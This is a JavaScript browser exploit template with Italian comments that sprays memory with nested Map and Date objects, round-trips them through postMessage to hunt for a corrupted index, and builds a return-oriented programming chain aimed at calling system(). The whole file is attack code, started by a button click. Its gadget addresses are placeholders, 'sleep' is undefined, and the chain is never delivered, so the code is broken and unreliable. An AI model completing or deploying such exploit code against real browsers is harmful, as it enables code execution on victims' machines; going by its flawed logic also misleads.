// Gadget per la ROP chain (esempio con indirizzi fittizi)
const gadgets = {
    "pop_rdi": 0x0000000000401234,  // Gadget pop rdi
    "pop_rsi": 0x0000000000405678,  // Gadget pop rsi
    "pop_rdx": 0x0000000000409abc,  // Gadget pop rdx
    "ret": 0x000000000040abcd,      // Ret
    "system": 0x0000000000401111,   // Indirizzo della funzione system()
    "exit": 0x0000000000402222      // Indirizzo di exit()
};

// Funzione per forzare Garbage Collection
function gc() {
    try {
        new Uint8Array(256 * 1024);  // Allocazione controllata per evitare crash
        alert('Garbage Collection eseguita');
    } catch (e) {
        alert("Errore durante Garbage Collection: " + e.message);
    }
}

// Funzione per creare una struttura di oggetti in Map per lo spray della memoria
function createObjectStructure(num_elems) {
    let root = new Map();
    let msg = root;
    let foo = [];

    // Riempire l'array foo con oggetti Date
    for (let i = 0; i < 5; i++) {
        foo.push(new Date(0xffff));
    }

    // Creazione della struttura Map
    for (let i = 0; i < num_elems; i++) {
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }

    gc();  // Esegui GC per liberare memoria
    alert('Struttura di oggetti creata');
    return root;
}

// Funzione per costruire una ROP chain
function ropChain() {
    const chain = [];
    chain.push(gadgets.pop_rdi);  // Pop RDI
    chain.push(gadgets.pop_rsi);  // Pop RSI
    chain.push(gadgets.pop_rdx);  // Pop RDX
    chain.push(gadgets.ret);      // Ret
    chain.push(gadgets.system);   // System
    chain.push(gadgets.exit);     // Exit
    return chain;
}

// Funzione principale
export async function main() {
    alert("Inizio exploit");

    const num_elems = 5;  // Ridotto per minimizzare il rischio di crash
    let root = createObjectStructure(num_elems);
    let msg = root;
    let idx = null;

    alert("Oggetto struttura creata");

    let found = false;
    while (!found) {
        let data = null;
        const prom = new Promise(resolve => {
            addEventListener('message', event => {
                data = event;
                resolve();
            }, { once: true });
        });

        alert("Postando messaggio...");
        postMessage(msg, origin);
        await prom;  // Aspetta il messaggio
        data = data.data;

        gc();  // Garbage Collection

        await sleep(100);  // Pausa breve per evitare sovraccarichi

        try {
            alert("Cercando l'indice...");
            for (let i = 0; i < num_elems; i++) {
                if (data.keys().next().value.getTime() === 0xffff) {
                    idx = i;
                    found = true;
                    break;
                }
                data = data.values().next().value[0];
            }
        } catch (e) {
            alert("Errore durante la ricerca dell'indice: " + e.message);
            break;
        }
    }

    if (found) {
        alert('[+] Indice trovato: ' + idx);
        let rop = ropChain();
        alert("ROP chain creata con successo.");
    } else {
        alert("Indice non trovato. Tentativo fallito.");
    }
}

// Aggiungi evento per avviare l'exploit al click del pulsante
document.getElementById('button').addEventListener('click', async () => {
    await main();
});
